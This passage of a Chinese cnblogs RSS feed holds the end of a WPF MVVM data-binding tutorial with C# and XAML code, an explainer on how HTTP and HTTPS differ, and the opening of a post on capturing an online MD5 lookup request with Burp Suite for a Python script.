&lt;p&gt;　　　　　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/1317220/201802/1317220-20180222162606178-890168207.gif&quot; alt=&quot;&quot; width=&quot;500&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　　　3.2 直接在代码中编辑控件代码；&lt;/p&gt;
&lt;p&gt;　　　　　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/1317220/201802/1317220-20180222163603467-1715006124.gif&quot; alt=&quot;&quot; width=&quot;500&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　4. 代码关联；&lt;/p&gt;
&lt;p&gt;　　　　4.1 View与ViewModel的交互关联：&lt;/p&gt;
&lt;p&gt;　　　　　　- View后台的代码关联&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;　　　　　public&lt;/span&gt; MainWindow() &lt;span&gt;//&lt;/span&gt;&lt;span&gt;类名&lt;/span&gt;
&lt;span&gt;        {
            InitializeComponent();
            DataContext &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; MainWindowViewModel();//后台代码有这句就实现了View和ViewModel的绑定&lt;/span&gt;&lt;br/&gt;　　　　　}
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;　　　　　　- 文本的绑定 &lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
　　　　　前端：&amp;lt;TextBox Text=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{Binding TxtInput}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;/&amp;gt;&lt;br/&gt;　　　　　后端：
&lt;/pre&gt;
&lt;p&gt;　　　　　　　　public string TxtInput&lt;br/&gt;　　　　　　　　{&lt;br/&gt;　　　　　　　　　　get =&amp;gt; _txtInput;&lt;br/&gt;　　　　　　　　　　set&lt;br/&gt;　　　　　　　　　　{&lt;br/&gt;　　　　　　　　　　　　_txtInput = value;&lt;br/&gt;　　　　　　　　　　　　RaisePropertyChanged(&quot;TxtInput&quot;); //用于刷新绑定的输入框&lt;br/&gt;　　　　　　　　　　}&lt;br/&gt;　　　　　　　　}&lt;/p&gt;
&lt;p&gt;　　　　　　　　private string _txtInput;&lt;/p&gt;
&lt;/div&gt;

&lt;p&gt;　　　　　　- 事件的绑定&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
　　　　　前端：&amp;lt;Button Content=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;添加&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; Command=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{Binding BtnAddContent}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;/&amp;gt;&lt;br/&gt;　　　　　后端：
&lt;/pre&gt;
&lt;p&gt;　　　　　　　　public MainWindowViewModel() &lt;br/&gt;　　　　　　　　{&lt;br/&gt;　　　　　　　　　　BtnAddContent = new RelayCommand(AddContent);&lt;br/&gt;　　　　　　　　}&lt;/p&gt;
&lt;p&gt;　　　　　　　　public RelayCommand BtnAddContent { get; set; }&lt;/p&gt;
&lt;p&gt;　　　　　　　　private void AddContent()&lt;br/&gt;　　　　　　　　{&lt;br/&gt; 　　　　　　　　　　//按钮事件处理的业务逻辑代码&lt;br/&gt;　　　　　　　　}&lt;/p&gt;
&lt;/div&gt;

&lt;p&gt;　　　　　　- 样式的绑定&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
　　　　　　&amp;lt;TextBox Style=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{StaticResource TxbTrigger}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; Tag=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;序号...&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; /&amp;gt;

　　　　　　&amp;lt;Button Content=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;添加&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; Template=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{StaticResource DefaultButton}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; /&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;”TxbTrigger是输入框水印样式资源，DefaultButton是按钮样式资源模板；详细样式代码，查阅源码中的Resources-Style;“&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1317220/201802/1317220-20180222165841075-1414435783.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　　　4.2 数据绑定和命令绑定的代码&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;　　public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ViewModelBase : INotifyPropertyChanged
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;event&lt;/span&gt;&lt;span&gt; PropertyChangedEventHandler PropertyChanged;
        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; RaisePropertyChanged&amp;lt;T&amp;gt;(Expression&amp;lt;Func&amp;lt;T&amp;gt;&amp;gt;&lt;span&gt; action)
        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; propertyName =&lt;span&gt; GetPropertyName(action);
            RaisePropertyChanged(propertyName);
        }
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; GetPropertyName&amp;lt;T&amp;gt;(Expression&amp;lt;Func&amp;lt;T&amp;gt;&amp;gt;&lt;span&gt; action)
        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; expression =&lt;span&gt; (MemberExpression)action.Body;
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; propertyName =&lt;span&gt; expression.Member.Name;
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; propertyName;
        }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; RaisePropertyChanged(&lt;span&gt;string&lt;/span&gt;&lt;span&gt; propertyName)
        {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (PropertyChanged != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
                PropertyChanged(&lt;/span&gt;&lt;span&gt;this&lt;/span&gt;, &lt;span&gt;new&lt;/span&gt;&lt;span&gt; PropertyChangedEventArgs(propertyName));
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;　　public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; RelayCommand : ICommand
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Action ExecuteAction; &lt;span&gt;//&lt;/span&gt;&lt;span&gt;执行方法&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; Action&amp;lt;&lt;span&gt;object&lt;/span&gt;&amp;gt; ExecuteCommand; &lt;span&gt;//&lt;/span&gt;&lt;span&gt;执行方法 带参数&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; Func&amp;lt;&lt;span&gt;object&lt;/span&gt;, &lt;span&gt;bool&lt;/span&gt;&amp;gt; CanExecuteCommand; &lt;span&gt;//&lt;/span&gt;&lt;span&gt;执行方法的条件&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; RelayCommand(Action action)&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 执行事件&lt;/span&gt;
&lt;span&gt;        {
            ExecuteAction &lt;/span&gt;=&lt;span&gt; action;
        }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; RelayCommand(Action&amp;lt;&lt;span&gt;object&lt;/span&gt;&amp;gt; action)&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 执行带参数的事件&lt;/span&gt;
&lt;span&gt;        {
            ExecuteCommand &lt;/span&gt;=&lt;span&gt; action;
        }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; RelayCommand(Action&amp;lt;&lt;span&gt;object&lt;/span&gt;&amp;gt; action, Func&amp;lt;&lt;span&gt;object&lt;/span&gt;, &lt;span&gt;bool&lt;/span&gt;&amp;gt; can)&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 根据条件执行带参数的事件&lt;/span&gt;
&lt;span&gt;        {
            ExecuteCommand &lt;/span&gt;=&lt;span&gt; action;
            CanExecuteCommand &lt;/span&gt;=&lt;span&gt; can;
        }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;event&lt;/span&gt; EventHandler CanExecuteChanged;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 当命令可执行状态发生改变时，应当被激发&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;bool&lt;/span&gt; CanExecute(&lt;span&gt;object&lt;/span&gt; parameter)&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 用于判断命令是否可以执行&lt;/span&gt;
&lt;span&gt;        {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (ExecuteAction != &lt;span&gt;null&lt;/span&gt;) &lt;span&gt;return&lt;/span&gt; &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; CanExecuteCommand == &lt;span&gt;null&lt;/span&gt; ||&lt;span&gt; CanExecuteCommand(parameter);
        }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Execute(&lt;span&gt;object&lt;/span&gt; parameter)&lt;span&gt;//&lt;/span&gt;&lt;span&gt;命令执行&lt;/span&gt;
&lt;span&gt;        {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (ExecuteCommand != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) ExecuteCommand(parameter);
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; ExecuteAction();
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ViewModel的业务类需要继承ViewModelBase&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;　　public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; MainWindowViewModel : ViewModelBase
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;前端的DataGrid绑定的数据需要用ObservableCollection类型定义列表；&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;　　　　　public&lt;/span&gt; ObservableCollection&amp;lt;AddModel&amp;gt;&lt;span&gt; AddContent
        {
            &lt;/span&gt;&lt;span&gt;get&lt;/span&gt; =&amp;gt;&lt;span&gt; _addContent;
            &lt;/span&gt;&lt;span&gt;set&lt;/span&gt;&lt;span&gt;
            {
                _addContent &lt;/span&gt;=&lt;span&gt; value;
                RaisePropertyChanged(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;AddContent&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;); 
&lt;span&gt;            }
        }

        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; ObservableCollection&amp;lt;AddModel&amp;gt; _addContent = &lt;span&gt;new&lt;/span&gt; ObservableCollection&amp;lt;AddModel&amp;gt;();
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&quot;AddModel&quot;是Model中的属性类；代表DataGrid中绑定的列名指向；&lt;/p&gt;
&lt;p&gt;DataGrid前端代码:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&amp;lt;DataGrid AutoGenerateColumns=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;False&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; x:Name&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;DgTimes&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; ItemsSource=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{Binding AddContent}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; 
          SelectedItem&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{Binding SelectTime,Mode=TwoWay,UpdateSourceTrigger=PropertyChanged}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
            &amp;lt;DataGrid.InputBindings&amp;gt;
                &amp;lt;MouseBinding Gesture=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;LeftDoubleClick&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; Command=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{Binding DgDoubleClick}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; 
                              CommandParameter&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{Binding ElementName=DgTimes, Path=SelectedItem}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; /&amp;gt;&amp;lt;!--双击事件--&amp;gt;
                &amp;lt;MouseBinding Gesture=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;LeftClick&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; Command=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{Binding DgClick}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
                              CommandParameter&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{Binding ElementName=DgTimes, Path=SelectedItem}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;/&amp;gt;&amp;lt;!--单击事件，也可以写在SelectedItem选中事件中--&amp;gt;
            &amp;lt;/DataGrid.InputBindings&amp;gt;
            &amp;lt;DataGrid.Columns&amp;gt;
                &amp;lt;DataGridTextColumn Header=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;序号&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; Binding=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{Binding RowIndex}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;/&amp;gt;
                &amp;lt;DataGridTemplateColumn Header=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;勾选？&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; MinWidth=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;30&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
                    &amp;lt;DataGridTemplateColumn.CellTemplate&amp;gt;
                        &amp;lt;DataTemplate&amp;gt;
                            &amp;lt;Grid&amp;gt;
                                &amp;lt;Image Width=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;20&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; Height=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;20&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; Source=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{Binding Photo}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;/&amp;gt;&amp;lt;!--图片的绑定--&amp;gt;
                            &amp;lt;/Grid&amp;gt;
                        &amp;lt;/DataTemplate&amp;gt;
                    &amp;lt;/DataGridTemplateColumn.CellTemplate&amp;gt;
                &amp;lt;/DataGridTemplateColumn&amp;gt;
                &amp;lt;DataGridTextColumn Header=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;输入内容&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; Binding=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{Binding AddContent}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;/&amp;gt;
                &amp;lt;DataGridTextColumn Header=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;时间&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; Binding=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{Binding AddTime}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;/&amp;gt;
            &amp;lt;/DataGrid.Columns&amp;gt;
        &amp;lt;/DataGrid&amp;gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;　　5. 执行效果；&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1317220/201802/1317220-20180222174150635-523244462.gif&quot; alt=&quot;&quot; width=&quot;1000&quot;/&gt;&lt;/p&gt;

&lt;p&gt;五、注意事项&lt;/p&gt;
&lt;blockquote readability=&quot;11&quot;&gt;
&lt;p&gt;本次项目制作并没有使用数据库的操作；源代码中也是没有！&lt;/p&gt;
&lt;p&gt;源码中包括了对输入框限制数字的输入方法；&lt;/p&gt;
&lt;p&gt;源码中包括了Button，TextBox，CheckBox，DataGrid等等样式资源代码；&lt;/p&gt;
&lt;p&gt;有些网友推荐 MVVMLight 或者 Prism 等第三方MVVM框架引用；&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;WPF做动画效果会很耗电脑资源，并且不会有性能优化；&lt;br/&gt;WPF使用异步的时候注意回到前端主线程才可以调用前端属性；&lt;br/&gt;MVVM只是推荐使用，要结合业务需求灵活变动使用，不是硬性规范；&lt;br/&gt;使用第三方控件和自定义属性会导致开发时界面灰掉；(暂时没找到解决方案)&lt;br/&gt;DataGrid加载不明确的图片，会加载超级慢;DataGrid默认开启数据虚化，会导致滚动条加载慢；&lt;/p&gt;
&lt;/blockquote&gt;


&lt;p&gt;&lt;code&gt; &lt;/code&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 22 Feb 2018 10:12:00 +0000</pubDate>
<dc:creator>叶耶①</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/yjwlogs/p/8459751.html</dc:identifier>
</item>
<item>
<title>关于http与https之间的区别 - 七尚</title>
<link>http://www.cnblogs.com/wangyue99599/p/8459734.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/wangyue99599/p/8459734.html</guid>
<description>&lt;p&gt;年前的时候进行了一家公司的电话面试两轮，视频面试一轮（已拿到offer），过程中遇到了一个关于http与https的问题，当时回答的并不好，今天将其进行了总结和整理，望读者喜欢；&lt;/p&gt;

&lt;p&gt;谷歌在2018年，2月9日宣布从今年7月起，Chrome浏览器将在地址栏把所有HTTP网址标示为不安全网站。&lt;/p&gt;
&lt;p&gt;谷歌早在2017年1月发布的Chrome 56，开始把要求用户输入密码或信用卡信息的HTTP网页标识为“不安全”；2017年10月发布的Chrome62，开始把需要输入数据的HTTP网页和在Incognito模式下浏览的HTTP网站标示为“不安全”。&lt;/p&gt;

&lt;p&gt;http：超文本传输协议，是一个客户端和服务器端请求和应答的标准，用于从WWW服务器传输超文本到本地浏览器的传输协议，它可以使浏览器更加高效，使网络传输减少。；&lt;/p&gt;
&lt;p&gt;https为：超文本传输安全协议，也就是说是http的安全版本，https由http进行通信，但利用SSL/TLS来加密数据包。&lt;/p&gt;
&lt;p&gt;HTTPS开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。这个协议由网景公司（Netscape）在1994年首次提出，随后扩展到互联网上。&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;容易被监听&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;http通信都是明文，数据在客户端与服务器通信过程中，任何一点都可能被劫持。比如，发送了银行卡号和密码，hacker劫取到数据，就能看到卡号和密码，这是很危险的&lt;/p&gt;
&lt;p&gt;http通信时，无法保证通行双方是合法的，通信方可能是伪装的。比如你请求++www.taobao.com++,你怎么知道返回的数据就是来自淘宝，中间人可能返回数据伪装成淘宝。&lt;/p&gt;
&lt;p&gt;hacker(黑客)中间篡改数据后，接收方并不知道数据已经被更改&lt;/p&gt;

&lt;p&gt;https恰好解决了上述的三个问题（被监听、被篡改、被伪装），https不是一种新协议，它是由http+SSL的结合体，由之前的http—–&amp;gt;tcp，改为http——&amp;gt;SSL—–&amp;gt;tcp；&lt;/p&gt;
&lt;p&gt;因为数据是加密的，hacker监听得到的是密文，看不懂的；&lt;/p&gt;
&lt;p&gt;https在通信过程中，客户端和服务器端都是携带证书的，证书相当于身份证，有证书就是合法，没有就是非法，证书由第三方颁布，很难伪造；&lt;/p&gt;
&lt;p&gt;https对数据进行了摘要处理，即使被篡改也是会被感知的，改了数据也没有用；&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;https比http更安全&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;http协议传输的数据时未经过加密的，也就是说是明文；&lt;br/&gt;https在使用http进行通信时，利用了SSL进行了加密传输、身份认证的网络协议（http+SSL），比http更安全。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;https使用需要CA证书，大部分都是付费使用的；&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;CA是Certificate Authority的缩写，也叫“证书授权中心”，也是需要第三方公司进行授权的。&lt;a href=&quot;https://www.cnblogs.com/handsomeBoys/p/6556336.html&quot;&gt;详情看这里&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;端口不一样&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;HTTP的URL由“&lt;a href=&quot;http://%E2%80%9D%E8%B5%B7%E5%A7%8B%E4%B8%94%E9%BB%98%E8%AE%A4%E4%BD%BF%E7%94%A880%E7%AB%AF%E5%8F%A3/&quot; class=&quot;uri&quot;&gt;http://”起始且默认使用80端口&lt;/a&gt;；&lt;/p&gt;
&lt;p&gt;HTTPS的URL由“&lt;a href=&quot;https://%E2%80%9D%E8%B5%B7%E5%A7%8B%E4%B8%94%E9%BB%98%E8%AE%A4%E4%BD%BF%E7%94%A8443%E7%AB%AF%E5%8F%A3/&quot; class=&quot;uri&quot;&gt;https://”起始且默认使用443端口&lt;/a&gt;；&lt;/p&gt;

&lt;p&gt;如图所示，https工作原理可以细分为八个步骤：&lt;br/&gt;&lt;img src=&quot;http://dl2.iteye.com/upload/attachment/0117/5180/680e53f4-9e30-3462-9474-0aa6c1d7be73.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;1 客户端发起HTTPS请求&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;用户在浏览器里输入一个https网址，然后连接到server的443端口。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;2 服务端的配置&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;就是指上述提到的数字证书；&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;3 传送证书&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Web服务器收到客户端请求后，会将网站的证书信息（证书中包含公钥）传送一份给客户端。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;4 客户端解析证书&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;客户端会对证书进行判断，验证公钥是否有效，存在问题弹出会警告；若没有问题，生成一个随机值（私钥），然后用证书继续进行加密；&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;5 传送加密信息&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;客户端将上加密后的随机值（私钥）提供给服务端，服务端会对其进行解密；&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;6 服务端解密信息&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;服务端解密后得到随机值（私钥），然后把内容通过该值进行对称加密。对称加密就是指把要返回的信息和随机值（私钥）混合加密，这样除非知道随机值（私钥），不然无法获取数据。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;7 传输加密后的信息&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;继续将加密后的信息传递给客户端；&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;8 客户端解密信息&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;客户端用之前生成的私钥（随机值）解密服务端传过来的信息，于是获取了解密后的内容。&lt;/p&gt;

&lt;p&gt;https虽然安全性比http高出很多但是也有一些缺点&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;握手阶段费时&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;因为SSL的缘故，HTTPS协议握手阶段比较费时，会使页面的加载时间延长近50%；&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;SSL证书需要花钱&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;便宜没好货，好货不便宜；&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;HTTPS连接缓存不如HTTP高效&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;HTTPS连接缓存不如HTTP高效，会增加数据开销和功耗，甚至已有的安全措施也会因此而受到影响；&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;SSL证书通常需要绑定IP&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;SSL证书通常需要绑定IP，不能在同一IP上绑定多个域名，IPv4资源不可能支撑这个消耗。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;有局限性&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;HTTPS协议的加密范围也比较有限，在黑客攻击、拒绝服务攻击、服务器劫持等方面几乎起不到什么作用。最关键的，SSL证书的信用链体系并不安全，特别是在某些国家可以控制CA根证书的情况下，中间人攻击一样可行。&lt;/p&gt;
&lt;p&gt;参考文章：&lt;/p&gt;
&lt;blockquote readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/HTTPS&quot; class=&quot;uri&quot;&gt;https://en.wikipedia.org/wiki/HTTPS&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/wqhwe/p/5407468.html&quot; class=&quot;uri&quot;&gt;https://www.cnblogs.com/wqhwe/p/5407468.html&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.csdn.net/wangjun5159/article/details/51510594&quot; class=&quot;uri&quot;&gt;http://blog.csdn.net/wangjun5159/article/details/51510594&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
<pubDate>Thu, 22 Feb 2018 10:07:00 +0000</pubDate>
<dc:creator>七尚</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/wangyue99599/p/8459734.html</dc:identifier>
</item>
<item>
<title>python写一个md5解密器 - 东京$</title>
<link>http://www.cnblogs.com/haq5201314/p/8459587.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/haq5201314/p/8459587.html</guid>
<description>&lt;p&gt;前言：&lt;/p&gt;
&lt;p&gt;md5解密，百度了一下发现教程不是很多也不详细。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1174022/201802/1174022-20180222171113354-1291452470.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这个图都没一张。。。跳转地址：&lt;a href=&quot;https://www.cnblogs.com/juemz/p/6682014.html&quot;&gt;点我&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;0x01&lt;/p&gt;
&lt;p&gt;windows环境，kali也可以啊&lt;/p&gt;
&lt;p&gt;burpsuite&lt;/p&gt;
&lt;p&gt;requests模块&lt;/p&gt;
&lt;p&gt;bs4模块&lt;/p&gt;
&lt;p&gt;0x02:&lt;/p&gt;
&lt;p&gt;设置好代理&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1174022/201802/1174022-20180222171450208-600278951.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;开启burpsuite&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1174022/201802/1174022-20180222171658649-120951160.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;（我这是新版的burp）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1174022/201802/1174022-20180222171737804-1911240119.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这代表设置好了。&lt;/p&gt;
&lt;p&gt;然后开启抓包&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1174022/201802/1174022-20180222171810542-145948191.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后，顺便输入个MD5点解密&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1174022/201802/1174022-20180222171928247-176166170.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后我们可以在burp上看到抓取的包&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1174022/201802/1174022-20180222172016214-900155396.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;丛图中我们可以看到数据是被url加密了的。我们找个网站进行url解密&lt;/p&gt;
&lt;p&gt;解密之后&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1174022/201802/1174022-20180222172152343-1156386845.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
